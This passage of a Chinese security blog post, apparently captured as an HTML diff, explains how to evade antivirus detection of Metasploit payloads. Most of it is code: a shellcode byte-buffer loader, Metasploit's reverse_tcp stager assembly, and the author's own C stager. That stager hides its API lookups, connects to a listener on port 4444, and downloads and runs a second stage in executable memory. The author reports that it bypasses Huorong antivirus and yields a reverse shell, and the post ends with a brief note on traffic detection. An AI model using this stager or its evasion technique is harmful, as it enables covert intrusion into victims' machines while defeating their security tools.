class="symbol">\x</span>33<span class="symbol">\x</span>03"</div><div class="line">"<span class="symbol">\x</span>d2<span class="symbol">\x</span>33<span class="symbol">\x</span>e7<span class="symbol">\x</span>8a<span class="symbol">\x</span>92<span class="symbol">\x</span>68<span class="symbol">\x</span>81<span class="symbol">\x</span>c3<span class="symbol">\x</span>26<span class="symbol">\x</span>d1<span class="symbol">\x</span>65<span class="symbol">\x</span>52<span class="symbol">\x</span>25<span class="symbol">\x</span>20<span class="symbol">\x</span>7b"</div><div class="line">"<span class="symbol">\x</span>b2<span class="symbol">\x</span>6f<span class="symbol">\x</span>8b<span class="symbol">\x</span>43<span class="symbol">\x</span>c4<span class="symbol">\x</span>4c<span class="symbol">\x</span>e7<span class="symbol">\x</span>80<span class="symbol">\x</span>90<span class="symbol">\x</span>16<span class="symbol">\x</span>e3<span class="symbol">\x</span>a7<span class="symbol">\x</span>da<span class="symbol">\x</span>71<span class="symbol">\x</span>82"</div><div class="line">"<span class="symbol">\x</span>8a<span class="symbol">\x</span>c7<span class="symbol">\x</span>5f<span class="symbol">\x</span>af<span class="symbol">\x</span>a0<span class="symbol">\x</span>47<span class="symbol">\x</span>1a<span class="symbol">\x</span>6c<span class="symbol">\x</span>8f<span class="symbol">\x</span>90<span class="symbol">\x</span>dc<span class="symbol">\x</span>79<span class="symbol">\x</span>52<span class="symbol">\x</span>84<span class="symbol">\x</span>30"</div><div class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>d3<span class="symbol">\x</span>45<span class="symbol">\x</span>82<span class="symbol">\x</span>80<span class="symbol">\x</span>86<span class="symbol">\x</span>7f<span class="symbol">\x</span>cb<span class="symbol">\x</span>52<span class="symbol">\x</span>29<span class="symbol">\x</span>64<span class="symbol">\x</span>51<span class="symbol">\x</span>03<span class="symbol">\x</span>5d<span class="symbol">\x</span>cb"</div><div class="line">"<span class="symbol">\x</span>db<span class="symbol">\x</span>13<span class="symbol">\x</span>80<span class="symbol">\x</span>9c<span class="symbol">\x</span>1a<span class="symbol">\x</span>46<span class="symbol">\x</span>d1<span class="symbol">\x</span>d5<span class="symbol">\x</span>58<span class="symbol">\x</span>30<span class="symbol">\x</span>79<span class="symbol">\x</span>d6<span class="symbol">\x</span>69<span class="symbol">\x</span>32<span class="symbol">\x</span>4e"</div><div class="line">"<span class="symbol">\x</span>7f<span class="symbol">\x</span>8a<span class="symbol">\x</span>ab<span class="symbol">\x</span>13<span class="symbol">\x</span>14<span class="symbol">\x</span>97<span class="symbol">\x</span>5d<span class="symbol">\x</span>96<span class="symbol">\x</span>ef<span class="symbol">\x</span>7c<span class="symbol">\x</span>3a<span class="symbol">\x</span>0e<span class="symbol">\x</span>03<span class="symbol">\x</span>d4<span class="symbol">\x</span>44"</div><div class="line">"<span class="symbol">\x</span>84<span class="symbol">\x</span>ca<span class="symbol">\x</span>8c<span class="symbol">\x</span>2a<span class="symbol">\x</span>44<span class="symbol">\x</span>d8<span class="symbol">\x</span>3d<span class="symbol">\x</span>17<span class="symbol">\x</span>24<span class="symbol">\x</span>ab<span class="symbol">\x</span>c6<span class="symbol">\x</span>6d<span class="symbol">\x</span>69<span class="symbol">\x</span>0f<span class="symbol">\x</span>72"</div><div class="line">"<span class="symbol">\x</span>cb<span class="symbol">\x</span>31<span class="symbol">\x</span>62<span class="symbol">\x</span>19<span class="symbol">\x</span>a9<span class="symbol">\x</span>4a<span class="symbol">\x</span>d1<span class="symbol">\x</span>f9<span class="symbol">\x</span>5c<span class="symbol">\x</span>e0<span class="symbol">\x</span>4e<span class="symbol">\x</span>d6<span class="symbol">\x</span>23<span class="symbol">\x</span>d9<span class="symbol">\x</span>86"</div><div class="line">"<span class="symbol">\x</span>d8<span class="symbol">\x</span>60<span class="symbol">\x</span>cf<span class="symbol">\x</span>55<span class="symbol">\x</span>9c<span class="symbol">\x</span>6b<span class="symbol">\x</span>1c<span class="symbol">\x</span>92<span class="symbol">\x</span>ca<span class="symbol">\x</span>37<span class="symbol">\x</span>11<span class="symbol">\x</span>51<span class="symbol">\x</span>04<span class="symbol">\x</span>44<span class="symbol">\x</span>e2"</div><div class="line">"<span class="symbol">\x</span>fa<span class="symbol">\x</span>05<span class="symbol">\x</span>e4<span class="symbol">\x</span>95<span class="symbol">\x</span>a5<span class="symbol">\x</span>4e<span class="symbol">\x</span>f2<span class="symbol">\x</span>70<span class="symbol">\x</span>d5<span class="symbol">\x</span>20<span class="symbol">\x</span>7c<span class="symbol">\x</span>ec<span class="symbol">\x</span>99<span class="symbol">\x</span>05<span class="symbol">\x</span>7f"</div><div class="line">"<span class="symbol">\x</span>f2<span class="symbol">\x</span>ad<span class="symbol">\x</span>87<span class="symbol">\x</span>36<span class="symbol">\x</span>ba<span class="symbol">\x</span>74<span class="symbol">\x</span>4c<span class="symbol">\x</span>e8<span class="symbol">\x</span>30<span class="symbol">\x</span>3c<span class="symbol">\x</span>36<span class="symbol">\x</span>7a<span class="symbol">\x</span>e7<span class="symbol">\x</span>18<span class="symbol">\x</span>bb"</div><div class="line">"<span class="symbol">\x</span>40<span class="symbol">\x</span>88<span class="symbol">\x</span>93<span class="symbol">\x</span>e3<span class="symbol">\x</span>19<span class="symbol">\x</span>86<span class="symbol">\x</span>da<span class="symbol">\x</span>9a<span class="symbol">\x</span>4b<span class="symbol">\x</span>ab<span class="symbol">\x</span>b2<span class="symbol">\x</span>bb<span class="symbol">\x</span>8e<span class="symbol">\x</span>bf<span class="symbol">\x</span>63"</div><div class="line">"<span class="symbol">\x</span>52<span class="symbol">\x</span>bc<span class="symbol">\x</span>8d";</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">	((void(*)())&amp;lpBinBuffer)();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>   <img src="http://hacky.wang/blog/20210829/OiAyqzupMi48.png?imageslim" alt="mark"></p>
+<h2 id="0x3-关于免杀的新思考"><a href="#0x3-关于免杀的新思考" class="headerlink" title="0x3 关于免杀的新思考"></a>0x3 关于免杀的新思考</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当我查看metasploit-framework源码的时候，在%metasploit-framework%/lib/msf/core/payload/windows/reverse_tcp.rb下看到了关于reverse_tcp这个payload的源码，发现实现reverse_tcp的方法很简单。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，调用WSAStartup，connect等一系列Windows Socket函数链接主机。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">reverse_tcp:</span></div><div class="line">  <span class="keyword">push</span> <span class="string">'32'</span>               <span class="comment">; Push the bytes 'ws2_32',0,0 onto the stack.</span></div><div class="line">  <span class="keyword">push</span> <span class="string">'ws2_'</span>             <span class="comment">; ...</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esp</span>                <span class="comment">; Push a pointer to the "ws2_32" string on the stack.</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'kernel32.dll'</span>, <span class="string">'LoadLibraryA'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; LoadLibraryA( "ws2_32" )</span></div><div class="line"></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x0190</span>         <span class="comment">; EAX = sizeof( struct WSAData )</span></div><div class="line">  <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="built_in">eax</span>            <span class="comment">; alloc some space for the WSAData structure</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esp</span>                <span class="comment">; push a pointer to this stuct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push the wVersionRequested parameter</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'WSAStartup'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; WSAStartup( 0x0190, &amp;WSAData );</span></div><div class="line"></div><div class="line"><span class="symbol">set_address:</span></div><div class="line">  <span class="keyword">push</span> #&#123;retry_count&#125;     <span class="comment">; retry counter</span></div><div class="line"></div><div class="line"><span class="symbol">create_socket:</span></div><div class="line">  <span class="keyword">push</span> #&#123;encoded_host&#125;    <span class="comment">; host in little-endian format</span></div><div class="line">  <span class="keyword">push</span> #&#123;encoded_port&#125;    <span class="comment">; family AF_INET and port number</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">esp</span>            <span class="comment">; save pointer to sockaddr struct</span></div><div class="line"></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; if we succeed, eax will be zero, push zero for the flags param.</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push null for reserved parameter</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; we do not specify a WSAPROTOCOL_INFO structure</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; we do not specify a protocol</span></div><div class="line">  <span class="keyword">inc</span> <span class="built_in">eax</span>                 <span class="comment">;</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push SOCK_STREAM</span></div><div class="line">  <span class="keyword">inc</span> <span class="built_in">eax</span>                 <span class="comment">;</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push AF_INET</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'WSASocketA'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span></div><div class="line">  <span class="keyword">xchg</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>           <span class="comment">; save the socket for later, don't care about the value of eax after this</span></div><div class="line"></div><div class="line"><span class="symbol">try_connect:</span></div><div class="line">  <span class="keyword">push</span> <span class="number">16</span>                 <span class="comment">; length of the sockaddr struct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; pointer to the sockaddr struct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the socket</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'connect'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; connect( s, &amp;sockaddr, 16 );</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用recv用于接收第二个stage的大小。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def asm_block_recv(opts=&#123;&#125;)</div><div class="line">  reliable     = opts[:reliable]</div><div class="line">  asm = %Q^</div><div class="line"><span class="symbol">    recv:</span></div><div class="line">      <span class="comment">; Receive the size of the incoming second stage...</span></div><div class="line">      <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; flags</span></div><div class="line">      <span class="keyword">push</span> <span class="number">4</span>                  <span class="comment">; length = sizeof( DWORD );</span></div><div class="line">      <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; the 4 byte buffer on the stack to hold the second stage length</span></div><div class="line">      <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the saved socket</span></div><div class="line">      <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'recv'</span>)&#125;</div><div class="line">      <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; recv( s, &amp;dwLength, 4, 0 );</span></div><div class="line">  ^</div><div class="line"></div><div class="line">  if reliable</div><div class="line">    asm &lt;&lt; %Q^</div><div class="line">      <span class="comment">; reliability: check to see if the recv worked, and reconnect</span></div><div class="line">      <span class="comment">; if it fails</span></div><div class="line">      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></div><div class="line">      <span class="keyword">jle</span> cleanup_socket</div><div class="line">    ^</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，调用recv接收第二个stage的内容，然后执行stage。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">asm &lt;&lt; %Q^</div><div class="line">    <span class="comment">; Alloc a RWX buffer for the second stage</span></div><div class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">esi</span>]          <span class="comment">; dereference the pointer to the second stage length</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x40</span>               <span class="comment">; PAGE_EXECUTE_READWRITE</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x1000</span>             <span class="comment">; MEM_COMMIT</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; push the newly recieved second stage length.</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; NULL as we dont care where the allocation is.</span></div><div class="line">    <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'kernel32.dll'</span>, <span class="string">'VirtualAlloc'</span>)&#125;</div><div class="line">    <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span></div><div class="line">    <span class="comment">; Receive the second stage and execute it...</span></div><div class="line">    <span class="keyword">xchg</span> <span class="built_in">ebx</span>, <span class="built_in">eax</span>           <span class="comment">; ebx = our new memory address for the new stage</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span>                <span class="comment">; push the address of the new stage so we can return into it</span></div><div class="line"></div><div class="line"><span class="symbol">  read_more:</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; flags</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; length</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span>                <span class="comment">; the current address into our second stage's RWX buffer</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the saved socket</span></div><div class="line">    <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'recv'</span>)&#125;</div><div class="line">    <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; recv( s, buffer, length, 0 );</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来事情就简单了，我重新仿写了一个stage，因为metasploit通过Hash获取函数地址，虽然Hash值会被加密，但是仍有可能被识别。然后为了减少通过API识别的可能性，我并不想直接调用API函数，或者间接调用API函数，我决定通过仿写GetProcAddress函数，获取各个函数的地址，然后获取第二个Stage并调用。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">   <span class="comment">//load ws2_32</span></div><div class="line">	HMODULE hModule_ws2 = LoadLibraryA(<span class="string">"ws2_32.dll"</span>);</div><div class="line">	HMODULE hModule_kernel32 = LoadLibraryA(<span class="string">"Kernel32.dll"</span>);</div><div class="line">	fnWSAStartup WSAStartup = (fnWSAStartup)MyGetFuncAddr(hModule_ws2, <span class="string">"WSAStartup"</span>);</div><div class="line">	fnWSASocket WSASocketA = (fnWSASocket)MyGetFuncAddr(hModule_ws2, <span class="string">"WSASocketA"</span>);</div><div class="line">	fnconnect connect = (fnconnect)MyGetFuncAddr(hModule_ws2, <span class="string">"connect"</span>);</div><div class="line">	fnrecv recv = (fnrecv)MyGetFuncAddr(hModule_ws2, <span class="string">"recv"</span>);</div><div class="line">	fnVirtualAlloc VirtualAlloc = (fnVirtualAlloc)MyGetFuncAddr(hModule_kernel32, <span class="string">"VirtualAlloc"</span>);</div><div class="line"></div><div class="line"></div><div class="line">	WSADATA wsaData;</div><div class="line">	<span class="keyword">int</span> iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</div><div class="line">	<span class="keyword">if</span> (iResult != NO_ERROR)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[!]WSAStartup"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	SOCKET socket = WSASocketA(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == socket)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[!]WSASocketA"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	SOCKADDR_IN Sockaddr;</div><div class="line">	Sockaddr.sin_family = AF_INET;</div><div class="line">	Sockaddr.sin_addr.s_addr = inet_addr(<span class="string">"10.10.10.293"</span>);</div><div class="line">	Sockaddr.sin_port = htons(<span class="number">4444</span>);</div><div class="line">	iResult = connect(socket, (SOCKADDR *)&amp;Sockaddr,<span class="keyword">sizeof</span>(Sockaddr));</div><div class="line">	<span class="keyword">if</span> (iResult != NO_ERROR) </div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[!]connect"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//recv stage length</span></div><div class="line">	DWORD dwLength = <span class="number">0</span>;</div><div class="line">	iResult = recv(socket, (<span class="keyword">char</span>*)&amp;dwLength, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</div><div class="line">	<span class="keyword">if</span> (iResult == SOCKET_ERROR)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[!]recv:%0x"</span>,GetLastError());</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//VirtualAlloc</span></div><div class="line">	<span class="keyword">char</span>* lpBinBuffer = <span class="literal">NULL</span>;</div><div class="line">	lpBinBuffer = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == lpBinBuffer)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[!]VirtualAlloc:%0x"</span>, GetLastError());</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	DWORD dwtotal = <span class="number">0</span>;</div><div class="line">	<span class="keyword">do</span></div><div class="line">	&#123;</div><div class="line">		<span class="comment">//recv stage </span></div><div class="line">		<span class="keyword">int</span> iResult = recv(socket, lpBinBuffer+ dwtotal, dwLength - dwtotal, <span class="number">0</span>);</div><div class="line">		<span class="keyword">if</span> (iResult == SOCKET_ERROR)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"[!]recv:%0x"</span>, GetLastError());</div><div class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">		&#125;</div><div class="line">		dwtotal += iResult;</div><div class="line"></div><div class="line">	&#125; <span class="keyword">while</span> (dwtotal &lt; dwLength);</div><div class="line"></div><div class="line">	<span class="comment">//for (DWORD dwIndex = 0; dwIndex &lt; dwLength; dwIndex++)</span></div><div class="line">	<span class="comment">//	lpBinBuffer[dwIndex] = lpBinBuffer[dwIndex] ^ 0x123;</span></div><div class="line">	</div><div class="line">	((<span class="keyword">void</span>(*)())lpBinBuffer)();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这并不会触发火绒的警报，并能反弹出一个shell<br>    <img src="http://hacky.wang/blog/20210829/l0CM0RnhJcll.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210829/GLP47aq5u0qE.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VT的结果如下。<br>    <img src="http://hacky.wang/blog/20210829/eU5VxoqKJB8I.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过Wireshark抓包，可以看到经过三次握手之后，首先会接收一个四字节的数据，这是stage的大小，然后开辟内存，接收stage的内容。<br>    <img src="http://hacky.wang/blog/20210829/5n0auwYB7zqj.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210829/OFju6eyJjpFU.png?imageslim" alt="mark"></p>
+<h2 id="0x4-基于流量的检测"><a href="#0x4-基于流量的检测" class="headerlink" title="0x4 基于流量的检测"></a>0x4 基于流量的检测</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上一部分，我们了解到 Metasploit首先会接收四字节的值，然后根据这个值开辟该大小的空间，然后接收Stage的内容。如此的话，可能有人提出，只需要检测网络中的PE数据就可以实现对Metasploit的检测。其实不然，在实网中，数据是杂乱的，有可能数据中也存在白的PE数据，所以不能单纯的检测PE数据来确定。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改源码即可。def handle_connection(conn, opts={})<br><a href="https://github.com/rapid7/metasploit-framework/blob/a1eef6a2c194284fe5e90be602eaa6417db51651/lib/msf/core/payload/stager.rb#L172" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/a1eef6a2c194284fe5e90be602eaa6417db51651/lib/msf/core/payload/stager.rb#L172</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/27/一篇文章带你了解Golang Reverse/" rel="next" title="一篇文章带你了解Golang Reverse">
+                <i class="fa fa-chevron-left"></i> 一篇文章带你了解Golang Reverse
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/07/12/C#反射总结/" rel="prev" title="C# 反射注入总结">
+                C# 反射注入总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findream</p>
+              <p class="site-description motion-element" itemprop="description">Apes--change the world's animals</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0-前言"><span class="nav-number">1.</span> <span class="nav-text">0x0 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-Metasploit基础知识"><span class="nav-number">2.</span> <span class="nav-text">0x1 Metasploit基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-我的免杀学习之路"><span class="nav-number">3.</span> <span class="nav-text">0x2 我的免杀学习之路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-关于免杀的新思考"><span class="nav-number">4.</span> <span class="nav-text">0x3 关于免杀的新思考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-基于流量的检测"><span class="nav-number">5.</span> <span class="nav-text">0x4 基于流量的检测</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findream</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
